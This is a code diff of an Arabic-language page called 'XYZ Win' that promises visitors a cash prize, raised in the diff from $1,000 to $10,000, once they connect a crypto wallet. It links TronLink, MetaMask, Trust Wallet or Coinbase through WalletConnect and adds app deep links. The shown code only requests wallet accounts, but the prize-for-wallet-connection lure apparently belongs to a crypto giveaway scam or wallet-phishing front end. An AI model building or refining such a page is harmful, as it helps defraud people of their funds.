@@ -272,7 +272,7 @@
         <i class="fas fa-coins"></i>
       </div>
       <p class="description">اختر محفظتك الرقمية لتفعيل جائزتك مباشرة.</p>
-     <section class="wallet-selection">
+  <section class="wallet-selection">
   <button class="wallet-btn" data-wallet="tronlink">
     <img
       src="https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"
@@ -368,7 +368,6 @@
         statusText.textContent = `✅ محفظة ${wallet} متصلة!`;
         return true;
       }
-      // جرب نتحقق من window.ethereum للحالات المحمولة
       if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isCoinbaseWallet)) {
         statusText.textContent = `✅ محفظة ${wallet} متصلة عبر window.ethereum!`;
         return true;
@@ -404,7 +403,6 @@
         await window.ethereum.request({ method: "eth_requestAccounts" });
         return true;
       } else if (wallet === "trustwallet" || wallet === "coinbase") {
-        // تحقق لو المتصفح يدعم window.ethereum مع المحفظة المحمولة
         if (window.ethereum && window.ethereum.isTrust) {
           provider = new ethers.providers.Web3Provider(window.ethereum);
           await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -415,29 +413,25 @@
           await window.ethereum.request({ method: "eth_requestAccounts" });
           return true;
         }
-
-        // خلاف ذلك، استخدم WalletConnect مع محاولة منع ظهور QR code تلقائياً
         if (!window.EthereumProvider) {
           statusText.textContent =
             "خطأ في تحميل مكتبة WalletConnect. تأكد من اتصالك بالإنترنت.";
           return false;
         }
-
         provider = await window.EthereumProvider.init({
           projectId: "f6b400b4393b83bb22abcaf805ad72d2",
           chains: [728126428], // Tron mainnet
           rpc: { 728126428: "https://api.trongrid.io" },
           metadata: {
             name: "XYZ Win",
-            description: "تفعيل جائزة 1000 دولار",
+            description: "تفعيل جائزة 10000 دولار",
             url: window.location.href,
             icons: [
               "https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg",
             ],
           },
-          // showQrModal: false, // ممكن تجرب تعطل QR لكن حسب المكتبة قد لا تنجح دائماً
+          // showQrModal: false,
         });
-
         try {
           await provider.connect();
           return true;
@@ -454,11 +448,34 @@
     }
   }
 
+  const walletLinks = {
+    tronlink: "tronlink://",
+    metamask: "metamask://",
+    trustwallet: "trust://",
+    coinbase: "cbwallet://",
+  };
+
   walletButtons.forEach((btn) => {
     btn.addEventListener("click", async () => {
       walletButtons.forEach((b) => b.classList.remove("selected"));
       btn.classList.add("selected");
       selectedWallet = btn.dataset.wallet;
+
+      // افتح التطبيق مباشرة لو موجود
+      const deepLink = walletLinks[selectedWallet];
+      if (deepLink) {
+        window.location.href = deepLink;
+        setTimeout(() => {
+          if (selectedWallet === "tronlink")
+            window.open("https://www.tronlink.org/", "_blank");
+          else if (selectedWallet === "metamask")
+            window.open("https://metamask.io/download/", "_blank");
+          else if (selectedWallet === "trustwallet")
+            window.open("https://trustwallet.com/", "_blank");
+          else if (selectedWallet === "coinbase")
+            window.open("https://www.coinbase.com/wallet", "_blank");
+        }, 2000);
+      }
 
       const isConnected = await checkWalletConnection(selectedWallet);
       if (!isConnected) {
@@ -507,6 +524,7 @@
     }
   });
 </script>
+
 
   </body>
 </html>
